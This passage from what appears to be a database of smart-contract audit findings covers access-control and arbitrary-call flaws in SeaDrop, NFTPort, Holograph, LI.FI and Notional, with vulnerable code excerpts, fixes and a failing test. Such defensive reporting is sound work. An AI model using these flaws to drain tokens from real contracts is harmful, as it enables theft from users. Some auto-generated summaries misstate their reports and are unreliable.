      "summary": "\nThis bug report is about the ERC721SeaDrop.sol and SeaDrop.sol contracts. There is a vulnerability in these contracts which allows the owner to call the updateTokenGatedDrop function twice in order to reset the feeBps to 0 for a drop. This vulnerability does not apply to the updatePublicDrop and updatePublicDropFee pair.\n\nThe severity of the issue is medium risk. The recommendation is that administrators should monitor all activities for updateTokenGatedDrop calls even when the same old allowedNftToken is used and make sure to set the fees after each call if it is not a removal kind.\n\nA proposed workaround is that the administrator/OpenSea is the only authorized user that can \"initialize\" a TokenGatedDrop. This sets the parameters to zero except maxTotalMintableByWallet = 1, feeBps, and restrictFeeRecipients = true. The Owner/Partner can then update the initialized TokenGatedDrop stage, which includes the possibility of deleting it. However, it would need to be re-initialized with a fee by OpenSea.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Seadrop-Spearbit-Security-Review.pdf",
      "pdf_page_from": 15,
      "contest_id": "",
      "slug": "owner-can-reset-feebps-set-byadmin-for-token-gated-drops-spearbit-seadrop-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "SeaDrop",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "SeaDrop",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Admin"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "6836",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "113",
      "title": "ERC721SeaDrop 's modifier onlyOwnerOrAdministrator would allow either the owner or theadmin to override the other person's config parameters.",
      "content": "## Severity: High Risk\n\n## Context\n- ERC721SeaDrop.sol#L106\n- ERC721SeaDrop.sol#L212\n- ERC721SeaDrop.sol#L289\n- ERC721SeaDrop.sol#L345\n\n## Description\nThe following 4 external functions in `ERC721SeaDrop` have the `onlyOwnerOrAdministrator` modifier which allows either one to override the other person's work:\n- `updateAllowedSeaDrop`\n- `updateAllowList`\n- `updateDropURI`\n- `updateSigner`\n\nThis means there should be some sort of off-chain trust established between these two entities. Otherwise, there are possible vectors of attack.\n\nHere is an example of how the owner can override `AllowListData.merkleRoot` and the other fields within `AllowListData` to generate proofs for any allowed SeaDrop `smintAllowList` endpoint that would have `MintParams.feeBps` equal to 0:\n\n1. The administrator calls `updateAllowList` to set the Merkle root for an allowed SeaDrop implementation for this contract and emit the other parameters as logs. The SeaDrop endpoint being called by `ERC721SeaDrop.updateAllowList`: `SeaDrop.sol#L827`\n   \n2. The owner calls `updateAllowList` but this time with new parameters, specifically a new Merkle root that is computed from leaves that have `MintParams.feeBps == 0`.\n\n3. Users/minters use the generated proof corresponding to the latest allow list update and pass their `mintParams.feeBps` as 0, thus avoiding the protocol fee deduction for the `creatorPaymentAddress` (`SeaDrop.sol#L187-L194`).\n\n## Recommendation\nOnly use this implementation of `IERC721SeaDrop` if there is already a legal off-chain contract and a level of trust between the different parties. Otherwise, a different implementation with a stricter separation of roles is recommended.\n\n## OpenSea\nThis is related to specific legal/BD requirements - we need to be able to administer the contract for partners (some may choose to administer it themselves), but for legal clarity, they also need to unambiguously be the \"owner\" of the contract, in that they have the power to administer it as well.\n\nIn practice, in this implementation of the contract, both parties should be considered trusted, but ideally shouldn't have privileges that overstep their bounds (in particular, fee and creator payouts). This contract is intended to be used as the basis for our first few partnered primary mints. As such, there are some assumptions and particular tailored logic to meet our and our partners' needs. (In hindsight, it might have made more sense to split out into a more-generic `ERC721SeaDrop`, and more-specific `ERC721PartnerSeaDrop`).\n\n## Assumptions\n- OpenSea will be collecting a fee\n- There is a good deal of trust (i.e., legal contracts) established between the two parties\n- Some partners will prefer (or require) us to configure drop mechanics and metadata  \n  – This is why some functions are `onlyOwnerOrAdministrator`.\n\n## Requirements (passed down from legal)\n- OpenSea is the \"Administrator\"\n- The Partner is the \"Owner\"\n- The Partner is the only entity in control of the pricing of the general drop and the creator payout address\n- OpenSea is the only entity that can update fees and fee recipients\n\nYou are correct that this requires trust between the two parties. As mentioned elsewhere, in general, an administrator will not be necessary for all token contracts.\n\nIn practice, a marketplace (OpenSea) will have to decide whether or not to provide a proof for a mint transaction depending on the allowed fee recipients and specified `feeBps` off-chain.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a vulnerability in the ERC721SeaDrop.sol contract which allows either the owner or the administrator to override the other person's config parameters. This could lead to potential attack vectors, such as the owner overriding the AllowListData.merkleRoot and other fields within AllowListData to generate proofs for any allowed SeaDrop 'smintAllowList endpoint that would have MintParams.feeBps equal to 0. \n\nOpenSea is the administrator and the partner is the owner, and the partner is the only entity in control of the pricing of the general drop and the creator payout address, while OpenSea is the only entity that can update fees and fee recipients. This requires trust between the two parties, and in general, an administrator will not be necessary for all token contracts.\n\nThe recommendation is that only use this implementation of IERC721SeaDrop if there is already a legal off-chain contract and level of trust between the different parties. Otherwise, a different implementation with a stricter separation of roles is recommended.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Seadrop-Spearbit-Security-Review.pdf",
      "pdf_page_from": 7,
      "contest_id": "",
      "slug": "erc721seadrop-s-modifier-onlyowneroradministrator-would-allow-either-the-owner-or-theadmin-to-spearbit-seadrop-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "SeaDrop",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "SeaDrop",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Admin"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "3551",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "125",
      "title": "M-6: Freezing roles in ERC721NFTProduct and ERC1155NFTProduct is moot",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/81 \n\n## Found by \n0x52\n\n## Summary\n\nIn ERC721NFTProduct and ERC1155NFTProduct roles can be frozen which is supposed to lock role to current addresses and not allow any changes. The problem is that admin can still use AccessControlUpgradable#grantRole and revokeRole to grant and remove roles to addresses because hasRole allows \"ADMIN_ROLE\" to bypass all role restrictions even \"DEFAULT_ADMIN_ROLE\".\n\n## Vulnerability Detail\n\n    function hasRole(bytes32 role, address account)\n        public\n        view\n        virtual\n        override\n        returns (bool)\n    {\n        return\n            super.hasRole(ADMIN_ROLE, account) || super.hasRole(role, account);\n    }\n\nIn GranularRoles.sol and AccessControlUpgradable.sol, developers are careful to never grant the \"DEFAULT_ADMIN_ROLE\" to any user. Additionally they never set the admin role of any role so that it's admin will remain \"DEFAULT_ADMIN_ROLE\". In theory this should make so that there is no way to grant or revoke roles outside of GranularRoles#_initRoles and updateRoles. The issue is that the override by GranularRoles#hasRole allows \"ADMIN_ROLE\" to bypass any role restriction including \"DEFAULT_ADMIN_ROLE\". This allows \"ADMIN_ROLE\" to directly call AccessControlUpgradable#grantRole and revokeRole, which makes the entire freezing system useless as it doesn't actually stop any role modification.\n\n## Impact\n\nFreezing roles doesn't actually prevent \"ADMIN_ROLE\" from modifying roles as intended. Submitting as high due to gross over-extension of admin authority clearly violating intended guardrails.\n\n## Code Snippet\n\n[GranularRoles.sol#L87-L96](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/lib/GranularRoles.sol#L87-L96)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOverride AccessControlUpgradable#grantRole and revokeRole in GranularRoles.sol to revert when called:\n\n     GranularRoles.sol\n\n    +   function grantRole(bytes32 role, address account) public virtual override {\n    +       revert();\n    +   }\n\n    +   function revokeRole(bytes32 role, address account) public virtual override {\n    +       revert();\n    +   }\n\n## Discussion\n\n**Evert0x**\n\nAdmin role having more power than intended is not a med/high issue for the protocol team.\n\n**hyperspacebunny**\n\n@Evert0x This actually is valid and pretty high priority for us since it's a workaround for some pretty explicit rules in our permissions system. Can you reopen it?\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/15\n\n**rayn731**\n\nThe fix will disable `DEFAULT_ADMIN_ROLE` to grant/revoke roles, but `_owner` still has the ability to grant/revoke roles even if all roles are frozen?\n\n**hyperspacebunny**\n\nYup, our current intent is that the owner should always have control over the roles if they want to self-manage, freezing is just to remove the delegation to `ADMIN_ROLE`",
      "summary": "\nThis bug report is about an issue in the ERC721NFTProduct and ERC1155NFTProduct smart contracts, which are used to manage Non-Fungible Tokens (NFTs). The issue is that roles can be frozen, which is supposed to lock the role to the current address and prevent any changes. However, the admin can still use AccessControlUpgradable#grantRole and revokeRole to grant and remove roles to addresses because hasRole allows \"ADMIN_ROLE\" to bypass all role restrictions even \"DEFAULT_ADMIN_ROLE\". This means that the freezing system is useless as it doesn't actually stop any role modification. \n\nThe vulnerability was found by 0x52, who used manual review to identify the issue. The code snippet linked to GranularRoles.sol#L87-L96, which contains the override by GranularRoles#hasRole allowing \"ADMIN_ROLE\" to bypass any role restriction. The impact of this issue is that the freezing system doesn't prevent \"ADMIN_ROLE\" from modifying roles as intended, and the severity of the issue was rated as high due to the gross over-extension of admin authority. \n\nA fix was proposed to override AccessControlUpgradable#grantRole and revokeRole in GranularRoles.sol to revert when called. This was then implemented in the pull request https://github.com/nftport/evm-minting-sherlock-fixes/pull/15, which disables \"DEFAULT_ADMIN_ROLE\" to grant/revoke roles. However, the owner still has the ability to grant/revoke roles even if all roles are frozen, as this is the current intent of the system.",
      "report_date": {},
      "contest_prize_txt": "25000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/14",
      "sponsor_name": "NFTPort",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/81",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "14",
      "slug": "m-6-freezing-roles-in-erc721nftproduct-and-erc1155nftproduct-is-moot-sherlock-nftport-nftport-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "NFTPort",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "NFTPort",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "5604",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "131",
      "title": "[M-11] Source contract can steal NFTs from users",
      "content": "\nA source contract can burn and transfer NFTs of users without their permission.\n\n### Proof of Concept\n\nEvery Holographed ERC721 collection is paired with a source contract, which is the user created contract that's extended by the Holographed ERC721 contract ([HolographFactory.sol#L234-L246](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L234-L246)). A source contract, however, has excessive privileges in the Holographed ERC721. Specifically, it can burn and transfer users' NFTs without their approval ([HolographERC721.sol#L500](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500), [HolographERC721.sol#L577](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577)):\n\n```solidity\nfunction sourceBurn(uint256 tokenId) external onlySource {\n  address wallet = _tokenOwner[tokenId];\n  _burn(wallet, tokenId);\n}\n\nfunction sourceTransfer(address to, uint256 tokenId) external onlySource {\n  address wallet = _tokenOwner[tokenId];\n  _transferFrom(wallet, to, tokenId);\n}\n```\n\nWhile this might be desirable for extensibility and flexibility, this puts users at the risk of being robbed by the source contract owner or a hacker who hacked the source contract owner's key.\n\n### Recommended Mitigation Steps\n\nConsider removing the `sourceBurn` and `sourceTransfer` functions of `HolographERC721` and requiring user approval to transfer or burn their tokens (`burn` and `safeTransferFrom` can be called by a source contract instead of `sourceBurn` and `sourceTransfer`).\n\n**[gzeon (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/290#issuecomment-1297281122):**\n > Also [`#403`](https://github.com/code-423n4/2022-10-holograph-findings/issues/403) brought up that source contract can also steal NFTs from burn address.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/290#issuecomment-1306692944):**\n > Need to add a `require(!_burnedTokens[tokenId], \"ERC721: token has been burned\");` check to sourceTransfer function\n\n**[alexanderattar (Holograph) resolved](https://github.com/code-423n4/2022-10-holograph-findings/issues/290#event-7817138955):**\n > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the HolographERC721 contract, which is part of the 2022-10-holograph project. The vulnerability allows a source contract to burn and transfer NFTs of users without their permission. This could put users at risk of being robbed by the source contract owner or a hacker who hacked the source contract owner's key. \n\nThe issue was identified through manual review. It is recommended that the `sourceBurn` and `sourceTransfer` functions of `HolographERC721` be removed and user approval be required to transfer or burn their tokens. This can be done by having the source contract call `burn` and `safeTransferFrom` instead of `sourceBurn` and `sourceTransfer`.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-10-holograph-contest",
      "sponsor_name": "Holograph",
      "sponsor_link": "https://twitter.com/holographxyz",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/290",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "170",
      "slug": "m-11-source-contract-can-steal-nfts-from-users-code4rena-holograph-holograph-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Holograph",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Holograph",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "7059",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "MEDIUM",
      "finders_count": 3,
      "protocol_id": "2",
      "title": "Improve dexAllowlist",
      "content": "## Security Analysis Report\n\n## Severity: Medium Risk\n\n### Context:\n- **Files:** \n  - SwapperV2.sol (#L67-L81)\n  - Swapper.sol (#L65-L78)\n  - LibAccess.sol (#L13-L15)\n  - DexManagerFacet.sol\n  - AccessManagerFacet.sol\n\n### Description:\nThe functions `_executeSwaps()` in both `SwapperV2.sol` and `Swapper.sol` employ a whitelist to ensure that the correct functions in the permitted DEXes are executed. The validation checks for `approveTo`, `callTo`, and `signature` (`callData`) are conducted independently. This independent approach creates a risk, as any signature can be considered valid for any DEX in conjunction with any `approveTo` address. This grants broader access than necessary.\n\nThis issue is critical because multiple functions may share the same signature. For instance, the following two functions have identical signatures:\n\n- `gasprice_bit_ether(int128)`\n- `transferFrom(address,address,uint256)`\n\nThe bytes4 signature for both is `0x23b872dd`. Notably, brute-forcing an innocuous-looking function is straightforward. \n\nThe `transferFrom()` function poses a particular threat as it enables the sweeping of tokens from other users who have granted an allowance to the LiFi Diamond. If a DEX that contains a function with the same signature gets whitelisted, this could be exploited with the existing code.\n\n**Present in both SwapperV2.sol and Swapper.sol:**\n```solidity\nfunction _executeSwaps(...) ... {\n    ...\n    if (\n        !(appStorage.dexAllowlist[currentSwapData.approveTo] &&\n        appStorage.dexAllowlist[currentSwapData.callTo] &&\n        appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])])\n    ) revert ContractCallNotAllowed();\n    ...\n}\n```\n\n### Recommendation:\nIn the whitelisting manager `DexManagerFacet.sol`, combine the `dex_address`, `approveTo`, and `signature` into a single set and whitelist them as a triple. Update the rest of the code (e.g., `SwapperV2.sol` and `Swapper.sol`) accordingly.\n\n**Note:** The library `LibAccess`, which has a similar functionality, already stores the duo of executor address and signature.\n\nFor additional safety, before whitelisting, double-check the function signatures using resources like 4byte.directory or sig.eth.samczun, applicable for both `DexManagerFacet.sol` and `AccessManagerFacet.sol`.\n\n### LiFi:\nWe vet all DEX addresses before adding them to our whitelist, recognizing that several of them share identical functions. We acknowledge the associated risks and intend to mitigate them through careful vetting of our whitelist, which should help prevent selector collisions.\n\n### Spearbit:\nAcknowledged. Careful verification helps prevent this issue.",
      "summary": "\nThis bug report is about the functions _executeSwaps() of both SwapperV2.sol and Swapper.sol, which use a whitelist to make sure the right functions in the allowed dexes are called. The checks for approveTo, callTo and signature (callData) are independent, which grants more access than necessary. This is because multiple functions can have the same signature, for example, a gasprice_bit_ether(int128) and a transferFrom(address,address,uint256) both have the same signature. The transferFrom() function is especially dangerous because it allows sweeping tokens from other users that have set an allowance for the LiFi Diamond. \n\nThe recommendation is to combine the dex_address, approveTo and signature as a set and whitelist them as a triple. The code should be adapted to match this. For extra safety, before whitelisting, double check the function signatures using 4byte.directory or sig.eth.samczun, both for the DexManagerFacet.sol and AccessManagerFacet.sol. LiFi acknowledges the risk and plans to mitigate it through careful vetting of their whitelist, avoiding selector collisions.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/LIFI-Spearbit-Security-Review.pdf",
      "pdf_page_from": 27,
      "contest_id": "",
      "slug": "improve-dexallowlist-spearbit-lifi-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "LI.FI",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "LI.FI",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Whitelist/Blacklist Match"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "7040",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "2",
      "title": "Too generic calls in GenericBridgeFacet allow stealing of tokens",
      "content": "## Security Report\n\n## Severity\n**High Risk**\n\n## Context\n- `GenericBridgeFacet.sol#L69-L120`\n- `LibSwap.sol#L30-L68`\n\n## Description\nWith the contract `GenericBridgeFacet`, the functions `swapAndStartBridgeTokensGeneric()` (via `LibSwap.swap()`) and `_startBridge()` allow arbitrary function calls, which enable anyone to call `transferFrom()` and steal tokens from users who have provided a large allowance to the LiFi protocol. This vulnerability has been exploited in the past.\n\n### Additional Risks\n- Ability to call the LiFi Diamond itself via functions that don’t have `nonReentrant`.\n- Potential cancellation of transfers for other users.\n- Calling functions protected by checks on `this`, such as `completeBridgeTokensViaStargate`.\n\n```solidity\ncontract GenericBridgeFacet is ILiFi, ReentrancyGuard {\n    function swapAndStartBridgeTokensGeneric(\n        ...\n        LibSwap.swap(_lifiData.transactionId, _swapData[i]);\n        ...\n    )\n    \n    function _startBridge(BridgeData memory _bridgeData) internal {\n        ...\n        (bool success, bytes memory res) = _bridgeData.callTo.call{ value: value }(_bridgeData.callData);\n        ...\n    }\n}\n\nlibrary LibSwap {\n    function swap(bytes32 transactionId, SwapData calldata _swapData) internal {\n        ...\n        (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue }(_swapData.callData);\n        ...\n    }\n}\n```\n\n## Recommendation\nWhitelist the external call addresses and function signatures for both the decentralized exchanges and the bridges. Note: `SwapperV2` already includes whitelist functionality for exchanges, but it isn’t utilized within this contract.\n\nAlternatively, ensure this code is no longer integrated into the LiFi Diamond. This can be accomplished by removing the code from the repository or adding a warning within the code itself.\n\n### LiFi Status\nThe feature has been removed from all contract deployments since the exploit. We do not intend to re-enable it, so it can be removed from the repository. See PR #4 for details.\n\n### Spearbit Status\nThe issue is resolved by deleting the `GenericBridgeFacet` contract.",
      "summary": "\nThis bug report is about a vulnerability in the GenericBridgeFacet and LibSwap contracts. It has been found that with these contracts, anyone can call the transferFrom() function, allowing them to steal tokens from users who have given a large allowance to the LiFi protocol. Additionally, this vulnerability also allows someone to call the Lifi Diamond itself, cancel transfers of other users, call functions that are protected by a check on this, and more. \n\nThe recommendation is to whitelist the external call addresses and function signatures for both the dexes and the bridges. Alternatively, the code can be removed from the repository and/or a warning can be added inside the code itself. LiFi has removed the code from all contract deployments since the exploit and do not plan to enable it again, so they plan to remove it from the repository. Spearbit has solved the issue by deleting the GenericBridgeFacet contract.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/LIFI-Spearbit-Security-Review.pdf",
      "pdf_page_from": 11,
      "contest_id": "",
      "slug": "too-generic-calls-in-genericbridgefacet-allow-stealing-of-tokens-spearbit-lifi-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "LI.FI",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "LI.FI",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "External Call"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "3348",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "137",
      "title": "M-23: `deleverageAccount` can still be called when a vault is paused",
      "content": "Source: https://github.com/sherlock-audit/2022-09-notional-judging/issues/17 \n\n## Found by \nArbitrary-Execution\n\n## Summary\n`deleverageAccount` can still be called when a vault is paused\n\n## Vulnerability Detail\nEvery vault has an `ENABLED` flag that can be toggled on an off, and is used to prevent certain vault account functions from being called in `VaultAccountAction.sol` when a vault is 'Paused'; these functions include: `enterVault` and `rollVaultPosition`. However, `deleverageAccount` is still able to be called even when a vault is paused.\n\n## Impact\nWhen the `ENABLED` flag is not set, meaning a vault is paused, liquidators will still be able to liquidate vault account positions. However, users are still able to call `exitVault` to either fully exit their position or lower their collateral ratio if necessary to avoid liquidation.\n\n## Code Snippet\nhttps://github.com/notional-finance/contracts-v2/blob/cf05d8e3e4e4feb0b0cef2c3f188c91cdaac38e0/contracts/external/actions/VaultAccountAction.sol#L261\n\nFailing test (add to `tests/stateful/vaults/test_vault_deleverage.py`):\n```python3\ndef test_deleverage_paused(environment, accounts, vault):\n    environment.notional.updateVault(\n        vault.address,\n        get_vault_config(currencyId=2, flags=set_flags(0, ENABLED=False)),\n        100_000_000e8,\n    )\n    maturity = environment.notional.getActiveMarkets(1)[0][1]\n\n    environment.notional.enterVault(\n        accounts[1], vault.address, 25_000e18, maturity, 100_000e8, 0, \"\", {\"from\": accounts[1]}\n    )\n    vault.setExchangeRate(0.85e18)\n    (cr, _, _) = environment.notional.getVaultAccountCollateralRatio(accounts[1], vault)\n    assert cr < 0.2e9\n\n    # would expect this call to revert when a vault is paused\n    with brownie.reverts(\"Cannot Enter\"):\n        environment.notional.deleverageAccount(\n            accounts[1], vault.address, accounts[2], 25_000e18, False, \"\", {\"from\": accounts[2]}\n        )\n```\n\n## Tool used\nManual Review\n\n## Recommendation\nConsider adding the following require statement to `deleverageAccount`:\n\n```solidity\nrequire(vaultConfig.getFlag(VaultConfiguration.ENABLED), \"Cannot Enter\");\n```\n\n## Discussion\n\n**jeffywu**\n\n@T-Woodward we can consider adding this, in general we like to allow liquidations to occur regardless but it's possible that we may need to disable deleverage due to some potential vulnerability.\n\n**T-Woodward**\n\nYes I still think it's riskier to disable deleveraging in a pause scenario. I suppose we could add a third state \"pause with no liquidations\" or something if you want to @jeffywu .\n\n**jeffywu**\n\nYes, I think adding a separate pause state will be worthwhile.",
      "summary": "\nThis bug report is about an issue found in the Notional Finance project, which is a decentralized finance protocol. The issue is that the `deleverageAccount` function can still be called when a vault is paused. This means that liquidators are still able to liquidate vault account positions when the `ENABLED` flag is not set, meaning a vault is paused. This can have an impact on users who are unable to call `exitVault` to either fully exit their position or lower their collateral ratio if necessary to avoid liquidation.\n\nThe bug was found by Arbitrary-Execution and a code snippet is provided in the report. A failing test was also added to the `tests/stateful/vaults/test_vault_deleverage.py` file. The recommendation is to consider adding a require statement to `deleverageAccount` to prevent this issue.\n\nThe discussion between Jeffywu and T-Woodward is that it is riskier to disable deleveraging in a pause scenario. Jeffywu suggests adding a separate pause state to prevent this issue.",
      "report_date": {},
      "contest_prize_txt": "100000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/2",
      "sponsor_name": "Notional",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 3,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-notional-judging/issues/17",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "2",
      "slug": "m-23-deleverageaccount-can-still-be-called-when-a-vault-is-paused-sherlock-notional-notional-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Notional",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
